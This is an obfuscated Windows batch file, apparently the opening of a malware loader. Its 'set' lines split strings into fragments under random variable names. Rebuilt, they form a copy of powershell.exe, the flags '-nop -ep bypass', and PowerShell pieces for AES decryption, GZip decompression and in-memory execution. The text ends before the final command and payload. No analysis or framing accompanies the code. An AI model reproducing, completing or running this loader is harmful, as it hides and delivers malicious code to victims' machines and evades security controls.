@echo off
set "udHqsOURxT=1."
set "FtSRYaUCCf=.e"
set "rUYjMxinnz=xe"
set "epgAWGRUwD=he"
set "WVsTTqBDEt=em"
set "YOgBRYKbHa=nd"
set "IABZeVzsRm=Wi"
set "dVMYilwViF=py"
set "rWRXcXEtsY=do"
set "HGWiXjSOHG=:\"
set "XDhSOkjsXG= C"
set "CnUJkNxUuW=rs"
set "WCnayBAFiD=\W"
set "dzBTcxfrDK=ll"
set "nOmNTOPtfQ=po"
set "XgmjYtgPxB=rS"
set "tHnCWxbiOT=s\"
set "zVVxyxEtgB=0\"
set "mpUWzxYEaY=ow"
set "QVvaDBTfRz=Po"
set "MoOjgZRlBo=we"
set "IssTuJImck=\v"
set "ExpSKuIrur=ws"
set "zRhHutGFzH=st"
set "GLCVqLwoCV=y "
set "BSUvkvIRDh=co"
set "QwIhWPzHRq=in"
set "YBLGgkgLry=ll"
set "hXOXqbBnCa= /"
set "XCmNovOjpG=32"
set "LRBKHTAvrZ=Sy"
set "WhrYpaLpYB=we"
set "hhmAAvAQtA=he"
set "nhFMtHxlSy= %~dp0"
set "igexcgkpxz=cd"
set "EQFdAZqyjN=-nop"
set "iOqFWhcIiP= '')"
set "QZpJcmuObv=, (,"
set "xkiAxMpwJt=Fina"
set "RQkpAHVwyZ=m.Re"
set "skHSCGuAvY=New-"
set "plJMJLbRBD=New-"
set "oqAaVCXihb=Conv"
set "FjzFOJcCpS=('KY"
set "lMLtbshhUh=Ti8L"
set "EgGgFbqyhY=rofi"
set "kwVLZcGXYZ=Sc ="
set "caSdXWQCGp=.-16"
set "oorVLWLhcG=1] -"
set "WHxfgfudFN=GNlX"
set "OQWMSmSjfE=vert"
set "JgiOOMztNO=I) {"
set "IpfoDXLqGI=[Sys"
set "bYzElQoWbP=oin "
set "aYEmbyLgbE=rtS4"
set "tijQrKpBaF=k.Su"
set "XmpAjhoOzZ=ypto"
set "PHMoZzkFtY=hi.D"
set "YibkmUVqDS=bnEz"
set "NIqBttnXdH=ddin"
set "zseCysMmuP=X, 0"
set "UeLsbkhMEs=ispo"
set "yhVsFLdAZn=mory"
set "EbozUSRmJg=P4Ia"
set "RcpnOMvobA=tem."
set "nohwyXYgxb=($ZY"
set "fuyhRoRMTH=yste"
set "rxtBmNcwoc=IpbE"
set "YqguOVDNrq=Etk/"
set "QBdLBQqimq=SoYj"
set "rIHkrncmte=gnir"
set "qswZITgBIH=ert]"
set "ZONorDKwhs=bstr"
set "UugcYQKAVj=..-1"
set "IUMfWpnsft=IpbE"
set "bkjvYfspfB=m.IO"
set "sQsRkMNIzG=$rVd"
set "TtesRYIyeD=pher"
set "fixVtiooOA=E.Pa"
set "JundNBcjTc=[Env"
set "aSjzBmfUvA=saBm"
set "QgjMsUWwPn=comp"
set "bDcvywTCzh== $q"
set "KxcCFLOUiT== [S"
set "SpmjhWNWZz=3); "
set "yPzqdTPXcw=16] "
set "yuidPOMnAj=.Com"
set "BKkJRpDGek=y.Pa"
set "VpugrxhmpE=::De"
set "lClZWRpVxC=;$xz"
set "XjtaWDFnzm=stem"
set "GVQOhYDWLg=e = "
set "yEOcVFXfgP=();$"
set "xvIPCjSVpU=Syst"
set "VWupuAfVLm=Disp"
set "xZpmnoFSGe=Comp"
set "rriFhpgSjX=:('g"
set "NsbBNzuTmx=2Q+X"
set "gFdEfAoFBo=ne);"
set "JGcoaNKrcO=$bNk"
set "JRlnxKitQP=ose("
set "Yuyfokblag= = ["
set "LNEQJGslwV=);$r"
set "HiRFnbZpju=6] -"
set "VDPijMKSoD=oint"
set "jOXRhnbqFR=bypa"
set "ddmxTmAhOy=-ep "
set "vifIByVidF=ment"
set "muMUxDxgce=[]] "
set "ggumKEDYLQ=)($Z"
set "BcUGKQtSdz=157K"
set "bspRhGlrgR='[-1"
set "jkMUioDnqL=X = "
set "RphBzIuxQE=m.IO"
set "ZDvkWPdmoz=oArr"
set "glrhtYmayD=-4] "
set "ZBkUXTQvrn=ion."
set "hmZZnAoLTr=Sc);"
set "FJIngNMcvV=y]::"
set "CdQJINoDST=.Mem"
set "kivrlgqdOC=BC;$"
set "jbFwItBoUg=eam("
set "RMXiTDiCRt=IpbE"
set "WSwZKBTint=comm"
set "ajrxVoFdpt=ZGNl"
set "pIrVxJSomp=dXz."
set "CDVnCAzfrQ= [Sy"
set "CLZTzXxMdl=$bNk"
